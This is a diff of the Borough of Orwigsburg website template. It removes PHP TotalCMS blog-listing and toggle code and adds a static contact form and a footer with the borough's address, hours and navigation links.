-</div></div><div class="total-blog-list blog_stacks_in_259 grid  " data-slug="history">
-
-
-<?php
-$post_template = <<<POSTTEMPLATE
-<article class="post  {{#authorlink}}author-{{authorlink}}{{/authorlink}} {{#genrelink}}genre-{{genrelink}}{{/genrelink}} {{#categories}}category-{{link}} {{/categories}} {{#tags}}tag-{{link}} {{/tags}} {{#labels}}label-{{link}} {{/labels}}   {{# featured }}featured{{/ featured }} {{# draft }}draft{{/ draft }} {{# archived }}archived{{/ archived }}">
-
-
-
-
-<div class="default-layout">
-  <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}">  <div class="post_layout_wrapper    layout1_stacks_in_260    " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_261   height-fixed " style=""> <div class="post_column1">  <h3 class="post-title  text-center  "><a href="{{ url }}" title="{{aria}} {{title}}">{{{ title }}}</a> <small> {{{ author }}}</small></h3>    
-</div>  </div>  
- <div class="post-image-wrapper stacks_in_264"> <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}"> {{#slideshow}} <ul class="post-image     {{ type }}" data-orbit data-options="animation:fade;pause_on_hover:false;navigation_arrows:true;slide_number:false;bullets:false;circular:true;timer:true;animation_speed:1500;timer_speed:{{timer}};"> {{/slideshow}} {{^slideshow}} <ul class="post-image     {{ type }}"> {{/slideshow}} {{#gallery}}  <li><img loading="auto" class="" src="{{ thumb.sq }}" alt="{{ alt }}"></li>  {{/gallery}} {{^ gallery }}    {{/ gallery }} </ul> </a> </div>   
-    <div class="post_layout_wrapper    layout1_stacks_in_265    " style=""> <div class="post_column1"> <time class="post-date  text-right  " datetime="{{ datetime }}" data-dateformat='MM-DD-YYYY' content="{{ datetime }}">{{ datetime }}</time>   
- <div class="post-categories  stacks_in_267 text-left  ">Department:  {{#categories}} <span> <a href="?category={{link}}" title="{{aria}} {{label}}">   {{label}} </a> </span> {{/categories}} </div>    
- <div class="post-tags stacks_in_268 text-left  ">Tags: {{#tags}} <span> <a href="?tag={{link}}" title="{{label}}">   {{label}} </a> </span> {{/tags}} </div>    
-</div>  </div>  
-    <div class="post_layout_wrapper    layout1_stacks_in_270    " style=""> <div class="post_column1"> <div class="post-summary  fr-view text-left  " >{{{ summary }}}</div>   
-</div>  </div>  
-</div>  </div> </a> 
-    <div class="post_layout_wrapper    layout1_stacks_in_274    " style=""> <div class="post_column1"><div class='slice empty out'><div class='slice empty in'></div></div></div>  </div>  
- <a role="button" href="{{ url }}" title="{{aria}} {{title}}" class="stacks_in_276  button readmore fixed-bottom  centered small custom radius">Details</a>   
-
-</div>
-
-
-
-
-
-
-</article>
-POSTTEMPLATE;
-?>
-
-
-
-
-<?php
-if ($publish) {
-    $totalcms["history"] = new \TotalCMS\Component\Blog("history", $_GET);
-} else {
-    $totalcms["history"] = new totalpreview("blog");
-}
-$totalblog = $totalcms["history"];
-
-if (isset($_GET["permalink"])) {
-    if (!(isset($blogpost) && is_object($blogpost))) {
-        // Get the existing post data if it exists
-        if ($publish) {
-            $totalblog->set_permalink($_GET["permalink"]);
-            $blogpost = $totalblog->get_contents();
-        } else {
-            $blogpost = $totalblog->get_blog_post("history", $_GET["permalink"]);
-        }
-    }
-}
-$filter = array(
-    "sort"     => "new",
-    "date"     => "all",
-    "featured" => "top",
-    "draft"    => "hide",
-    "archived" => "hide"
-);
-
-$authorGallery = $categoryGallery = $tagGallery = $genreGallery = false;
-
-// 
-
-// 
-
-// 
-
-// 
-
-// Blog post is not defined, default to false
-$postGenre    = false;
-$postLabel    = false;
-$postAuthor   = false;
-$postCategory = false;
-$postTag      = false;
-
-if (isset($blogpost) && is_object($blogpost)) {
-    $postAuthor   = false;
-    $postGenre    = false;
-    $postLabel    = false;
-    $postCategory = false;
-    $postTag      = false;
-
-    // 
-    $filter["exclude"] = $blogpost->permalink;
-    // 
-}
-
-// 
-// 
-// 
-// 
-// 
-// 
-
-// 
-if (!empty($_GET)) {
-    // Merge in with GET variables. GET wins
-    $filter = array_merge($filter, $_GET);
-}
-// 
-
-if ($publish) {
-    if (empty($_GET["search"])) {
-        $posts = $totalblog->filter_posts($filter);
-    } else {
-		// 
-        $posts = $totalblog->search_posts(trim(urldecode($_GET["search"])), $filter);
-		// 
-    }
-
-    $baseUrl = "../";
-    // 
-    $posturl = $totalblog->posturl;
-// 
-} else {
-    $posts   = $totalblog->get_blog("history", $filter);
-    $baseUrl = "https://orwigsburg.gov/";
-    $posturl = "#";
-}
-
-// 
-
-$imagetype   = "thumbs-auto";
-$maxcount    = 3;
-$cardColumns = 2;
-$postdata    = array();
-
-foreach ($posts as $post) {
-    if ($post->gallery) {
-        array_map(function ($image) use ($baseUrl) {
-            $image->img       = $baseUrl.$image->img;
-            $image->thumb->sq = $baseUrl.$image->thumb->sq;
-            $image->thumb->th = $baseUrl.$image->thumb->th;
-            return $image;
-        }, $post->gallery);
-
-        $post->slideshow = false;
-        $post->type = $imagetype;
-        $imagecount = count($post->gallery);
-
-        // 
-
-        // 
-
-        // Dont process just one image unless its a thumb layout
-        if ($imagecount > 1 || strpos($imagetype, "thumb") !== false) {
-            switch ($imagetype) {
-                case "featured":
-                    usort($post->gallery, function ($a, $b) {
-                        return $b->featured - $a->featured;
-                    });
-                    $post->gallery = array(array_shift($post->gallery));
-                    break;
-                case "first":
-                    $post->gallery = array(array_shift($post->gallery));
-                    break;
-                case "last":
-                    $post->gallery = array(array_pop($post->gallery));
-                    break;
-                case "random":
-                    shuffle($post->gallery);
-                    $post->gallery = array(array_shift($post->gallery));
-                    break;
-                case "orbit":
-                    $post->slideshow = true;
-                    $post->gallery = array_slice($post->gallery, 0, $maxcount);
-                    break;
-                case "thumbs":
-                    $thumbCount = $maxcount;
-
-                    if ($cardColumns == 0) {
-                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
-                        $thumbCount = $max;
-                    } elseif ($cardColumns > $imagecount) {
-                        // If there isn"t enough images to fill one row, only have one image
-                        $post->type = "first";
-                        $thumbCount = 1;
-                    } else {
-                        // Make sure that there are no empty slots in a row
-                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
-                        $thumbCount = floor($max/$cardColumns) * $cardColumns;
-                    }
-                    $post->gallery = array_slice($post->gallery, 0, $thumbCount);
-                    break;
-                case "thumbs-auto":
-                    $thumbCount = $maxcount;
-                    $mincount = 4;
-
-                    if ($mincount > $imagecount) {
-                        // If there isn"t enough images to fill one grid, only have one image
-                        $post->type = "first";
-                        $thumbCount = 1;
-                    } else {
-                        // Make sure that there are no empty slots in a row
-                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
-                        $columns = floor(sqrt($max));
-                        $thumbCount =  $columns * $columns;
-                        $post->type = $post->type." thumb-grid-".$columns;
-                    }
-
-                    $post->gallery = array_slice($post->gallery, 0, $thumbCount);
-                    break;
-            }
-        }
-    }
-
-    $post->summary  = $totalblog->format_text($post->summary);
-    $post->datetime = $totalblog->to_date($post->timestamp);
-    $post->timer    = (5*1000) + rand(0, 2500);
-    $post->url      = $posturl.$post->permalink;
-    $post->id       = "history/".$post->permalink;
-    $post->aria     = "Read more about ";
-
-    $post->genrelink = $totalblog->urlify_string($post->genre);
-    if (is_object($genreGallery)) {
-        $genreImage = $genreGallery->get_image_path($post->genrelink, "sq");
-        $defaultgenre = "";
-        if (empty($defaultGenre)) {
-            $defaultGenre = "https://orwigsburg.gov/cms-data/image/defaultGenreCMSID.png";
-        }
-        $post->genreimage = $genreImage ? $baseUrl.$genreImage : $defaultGenre;
-    }
-
-    $post->authorlink = $totalblog->urlify_string($post->author);
-    if (is_object($authorGallery)) {
-        $authorImage = $authorGallery->get_image_path($post->authorlink, "sq");
-        $defaultAuthor = "";
-        if (empty($defaultAuthor)) {
-            $defaultAuthor = "https://orwigsburg.gov/cms-data/image/defaultAuthorCMSID.png";
-        }
-        $post->authorimage = $authorImage ? $baseUrl.$authorImage : $defaultAuthor;
-    }
-
-    $post->tags = array_map(function ($tag) use ($totalblog, $tagGallery) {
-        // ignore if the tag is already converted to array
-        if (is_array($tag)) {
-            return $tag;
-        }
-        // ignore if the tag starts with -
-        if (strpos($tag, "-") === 0) {
-            return false;
-        }
-
-        $link = $totalblog->urlify_string($tag);
-        $new = array("label"=>$tag,"link"=>$link);
-
-        if (is_object($tagGallery)) {
-            $image = $tagGallery->get_image_path($link, "sq");
-            $defaultTag = "";
-            if (empty($defaultTag)) {
-                $defaultTag = "https://orwigsburg.gov/cms-data/image/defaultTagCMSID.png";
-            }
-            $new["image"] = $image ? "https://orwigsburg.gov/".$image : $defaultTag;
-        }
-
-        return $new;
-    }, $post->tags);
-	$post->tags = array_values(array_filter($post->tags, "is_array"));
-
-
-    $post->categories = array_map(function ($category) use ($totalblog, $categoryGallery) {
-        // ignore if the category is already converted to array
-        if (is_array($category)) {
-            return $category;
-        }
-        // ignore if the category starts with -
-        if (strpos($category, "-") === 0) {
-            return false;
-        }
-
-        $link = $totalblog->urlify_string($category);
-        $new = array("label"=>$category,"link"=>$link);
-
-        if (is_object($categoryGallery)) {
-            $image = $categoryGallery->get_image_path($link, "sq");
-            $defaultCategory = "";
-            if (empty($defaultCategory)) {
-                $defaultCategory = "https://orwigsburg.gov/cms-data/image/defaultCategoryCMSID.png";
-            }
-            $new["image"] = $image ? "https://orwigsburg.gov/".$image : $defaultCategory;
-        }
-
-        return $new;
-    }, $post->categories);
-    $post->categories = array_values(array_filter($post->categories, "is_array"));
-
-    // This is here for pre-1.7 posts that do not have labels
-    if (!isset($post->labels)) {
-        $post->labels = [];
-    }
-
-    $post->labels = array_map(function ($label) use ($totalblog) {
-        // ignore if the label is already converted to array
-        if (is_array($label)) {
-            return $label;
-        }
-        // ignore if the label starts with -
-        if (strpos($label, "-") === 0) {
-            return false;
-        }
-
-        $link = $totalblog->urlify_string($label);
-        $new = array("label"=>$label,"link"=>$link);
-
-        return $new;
-    }, $post->labels);
-    $post->labels = array_values(array_filter($post->labels, "is_array"));
-
-    $postdata[] = $post;
-}
-
-if (count($postdata) == 0) {
-    echo "<h6 class=\"no-posts text-center\">There are Currently No History Articles to Display</h6>";
-} else {
-    foreach (array_slice($postdata, 0, 12) as $post) {
-        echo $totalblog->process_template($post_template, $post);
-    }
-}
-?>
-
-</div>
-
-
-
-<script id="posts_stacks_in_259" type="application/json">
-<?php echo json_encode(array_slice($postdata, 12)); ?>
-</script>
-<template id="template_stacks_in_259">
-<?php echo $post_template ?>
-</template>
-
-
-
-
-<button id="loadmore_stacks_in_259" role="button"
-    class="button loadmore expand  small custom radius"
-    >Load More Results</button>
-
-
-
-
-
- 
- </div> </div> 
+<div id='stacks_out_285' class='stacks_out'><div id='stacks_in_285' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_286' class='stacks_out'><div id='stacks_in_286' class='stacks_in com_joeworkman_stacks_foundation_form_base_stack'> <form id="stacks_in_286_form" action="" method="post" class="" autocomplete="on" data-abide>  <div id='stacks_out_289' class='stacks_out'><div id='stacks_in_289' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
+<div class='row     '  > <div class='columns small-12    medium-6     ' >  <div id='stacks_out_292' class='stacks_out'><div id='stacks_in_292' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Your Name</label>    <input type="text" name="name" spellcheck="true" placeholder="Type Your Name Here"  />    
+</div></div><div id='stacks_out_293' class='stacks_out'><div id='stacks_in_293' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Phone Number</label>    <input type="text" name="phone" spellcheck="true" placeholder="Enter Your Phone Number Here"  pattern="\S+.*"  /> <small class="error" id="error_stacks_in_293">This field must contain a phone number</small>    
+</div></div><div id='stacks_out_294' class='stacks_out'><div id='stacks_in_294' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Your Email Address</label>    <input type="text" name="email" spellcheck="true" placeholder="Type Your Email Address Here"  pattern="email"  /> <small class="error" id="error_stacks_in_294">This field must contain a valid email address</small>    
+</div></div><div id='stacks_out_295' class='stacks_out'><div id='stacks_in_295' class='stacks_in com_joeworkman_stacks_foundation_form_checkbox_stack'><label for="stacks_in_295_input">How would you like to be contacted?</label>    <label for="input0_stacks_in_295"><input type="radio" name="contacthow[]" value='email' id="input0_stacks_in_295"  required> Email Me</label>    <label for="input1_stacks_in_295"><input type="radio" name="contacthow[]" value='Phone' id="input1_stacks_in_295" required> Call Me</label>   <label for="input2_stacks_in_295"><input type="radio" name="contacthow[]" value='no-contact' id="input2_stacks_in_295" required> No need to contact me</label>    
+</div></div><div id='stacks_out_305' class='stacks_out'><div id='stacks_in_305' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
+</div></div><div id='stacks_out_304' class='stacks_out'><div id='stacks_in_304' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Spam Control: What is 3+5 ?</label>    <input type="password" name="spam control" spellcheck="true" placeholder="Spam Control" required pattern="[8]"  /> <small class="error" id="error_stacks_in_304">Wrong Answer Please enter 8</small>    
+</div></div>  </div> <div class='columns small-12    medium-6     ' >  <div id='stacks_out_300' class='stacks_out'><div id='stacks_in_300' class='stacks_in com_joeworkman_stacks_foundation_form_input_stack'> <label>Topic</label>    <input type="text" name="topic" spellcheck="true" placeholder="Type Your Topic Here"  />    
+</div></div><div id='stacks_out_301' class='stacks_out'><div id='stacks_in_301' class='stacks_in com_joeworkman_stacks_foundation_form_textarea_stack'> <label class="">Please add your question/comments below</label>     <textarea spellcheck="true" rows="12" placeholder="Type your question/comments here" name="details"></textarea>   
+</div></div>  </div> </div> 
+</div></div><div id='stacks_out_306' class='stacks_out'><div id='stacks_in_306' class='stacks_in com_joeworkman_stacks_foundation_paragraph_s3_stack'> <p class="text-left    " draggable="false" ><strong>NOTE:</strong> Upon Successful Form Submission, You Will Be Redirected To The Home Page</p>  
+</div></div><div id='stacks_out_308' class='stacks_out'><div id='stacks_in_308' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>    <button aria-label="submit form" class="button        " value="Submit" type="submit">Submit</button>     
+</div></div> </form> <i class="fa fa-circle-o-notch fa-spin in-progress"></i> <div data-alert class="alert-box success">Thank you! Your submission was successfully sent :-)<a href="#" class="close">&times;</a></div> <div data-alert class="alert-box alert">Opps! Some went wrong... Your submission did not go through :-(<a href="#" class="close">&times;</a></div>  <script type="text/template" id="template_stacks_in_286">  <strong>General Contact Form</strong><br /><br /><strong>Name: </strong> {{name}}<br /><strong>Email: </strong> {{email}}<br /><strong>Phone:</strong> {{phone}}<br /><strong>Contact Method:</strong> {{contacthow}}<br /><br /><strong>Subject:</strong> {{topic}}<br /><br /><strong>Details:</strong><br />{{details}}  </script>   
+</div></div> </div> </div> 
 </div></div> </div> </div> 
 </div></div><div id='stacks_out_255' class='stacks_out'><div id='stacks_in_255' class='stacks_in '><div id='stacks_out_255_1' class='stacks_out'><div id='stacks_in_255_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row  collapse max-edge     '  > <div class='columns small-12      '> <div  class="sgw-footer" style=""> <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-top-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
+  
 	<div id='stacks_out_255_47' class='stacks_out'><div id='stacks_in_255_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
 <div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-logo-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_52' class='stacks_out'><div id='stacks_in_255_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='%cmsImageAlt(footer-logo)%' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   
+  
+	<div id='stacks_out_255_52' class='stacks_out'><div id='stacks_in_255_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   
 
 
 
@@ -996,118 +494,72 @@ if (count($postdata) == 0) {
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
-  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_255_10' class='stacks_out'><div id='stacks_in_255_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-top)%    
+  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_255_10' class='stacks_out'><div id='stacks_in_255_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h3>&nbsp; &nbsp;<br><br></h3><h1><strong>Borough Of Orwigsburg</strong></h1>    
  
 </div></div>  </div> </div> 
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
 <div id='stacks_out_255_41' class='stacks_out'><div id='stacks_in_255_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
 </div></div><div id='stacks_out_255_15' class='stacks_out'><div id='stacks_in_255_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
 <div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-left-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_22' class='stacks_out'><div id='stacks_in_255_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-left)%    
+  
+	<div id='stacks_out_255_22' class='stacks_out'><div id='stacks_in_255_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Contact Information</h4><p><strong>Address</strong><br>333 S. Liberty St.<br>Orwigsburg, Pa 17961</p><p><strong>Office Hours</strong><br>8:00 a.m. to 5:00 p.m.<br>Phone Hours<br>8:00 a.m. to 5: 00 p.m.<br><strong>Phone</strong><br>(570)-366-3103<br><strong>Fax</strong><br>(570)-366-3106<br><br><a href="/contact"><strong>Contact Form</strong></a></p><p><br><br><br></p>    
  
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
   </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-cent-left-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_26' class='stacks_out'><div id='stacks_in_255_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-leftcenter)%    
+  
+	<div id='stacks_out_255_26' class='stacks_out'><div id='stacks_in_255_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Living &amp; Working</h4><p><a href="/history">Borough History<br></a><a href="/live/churches/">Churches</a><br><a href="/play/events/">Events</a><br><a href="/fyi">FYI Articles</a><br><a href="/government/employment/">Job Openings<br></a><a href="/live/library/">Library</a><br><a href="/live/orgs/">Organizations<br></a><a href="/play/parks-rec/">Parks &amp; Recreation<br></a><a href="/gallery">Photo Gallery<br></a><a href="/live/schools/">Schools</a><a href="/history"></a></p>    
+ 
+</div></div></div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
+
+
+
+
+
+  
+	<div id='stacks_out_255_30' class='stacks_out'><div id='stacks_in_255_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Services</h4><p><a href="/services/utility-payment/">Utility Payment<br></a><a href="/services/ambulance/">Ambulance Service<br></a><a href="/services/police/">Police Department</a><br><a href="/services/water/">Water Department<br></a><a href="/services/streets/">Streets Department</a><br><a href="/services/sewer/">Sewer Department</a><br><a href="/services/fire/">Fire Department</a><br><a href="/services/garbage-recycling/">Sanitation Department</a><br><a href="/services/swift/"></a><a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg">RAVE Mobile Safety</a></p><p><br><br><br></p>    
  
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
   </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-cent-right-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_30' class='stacks_out'><div id='stacks_in_255_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-rightcenter)%    
+  
+	<div id='stacks_out_255_34' class='stacks_out'><div id='stacks_in_255_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Government</h4><p><a href="/government/forms/"></a><a href="/government/forms/">Borough Forms</a><br><a href="/government/officials/">Borough Officials</a><br><a href="/government/building-zoning/">Building/Zoning Codes</a><br><a href="/government/community-reports/">Community Reports</a><br><a href="/government/employment/">Employment</a><br><a href="/government/financials/">Financial Reports</a><br><a href="/government/gov-news">Government News</a><br><a href="/government/public-meetings/">Public Meetings</a><br><a href="/government/tax-collection/">Tax Collection</a> <br><br><br></p><p><br></p>    
  
 </div></div>
 
 
- <?php } else { ?> 
-
-
-
- <?php } ?> 
-
- 
-  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->
-
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-right-togg");
-	$toggle = $totaltoggle->status();
-?>
-
-
-
-
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_34' class='stacks_out'><div id='stacks_in_255_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-right)%    
- 
-</div></div>
-
-
- <?php } else { ?> 
-
-
-
- <?php } ?> 
+  
 
  
   </div> </div> 
@@ -1115,25 +567,15 @@ if (count($postdata) == 0) {
 </div></div><div id='stacks_out_255_2' class='stacks_out'><div id='stacks_in_255_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
 <div class='row  collapse max-custom     '  > <div class='columns small-12  small-centered      '> <!-- Total Toggle -->
 
-<?php
-	$totaltoggle = new \TotalCMS\Component\Toggle("footer-bott-togg");
-	$toggle = $totaltoggle->status();
-?>
 
 
 
 
- <?php if ($toggle) { ?> 
-	<div id='stacks_out_255_38' class='stacks_out'><div id='stacks_in_255_38' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-bottom)%    
- 
-</div></div>
-
-
- <?php } else { ?> 
+  
 
 
 
- <?php } ?> 
+  
 
  
  </div> </div> 
@@ -1142,16 +584,8 @@ if (count($postdata) == 0) {
 <div  class="sgw-developer" style=""> <div id='stacks_out_255_8' class='stacks_out'><div id='stacks_in_255_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
 </div></div> </div>  
  </div> </div> 
-</div></div></div></div></div></div>
-<!--  -->
-<?php
-	if ($process_macros) {
-	    $totalob = ob_get_clean();
-	    ob_start();
-		$totalreplace = new \TotalCMS\ReplaceText();
-		echo $totalreplace->replace($totalob,$macro_prefix);
-	}
-?>
+</div></div></div></div></div></div><!--  -->
+
 
 
 
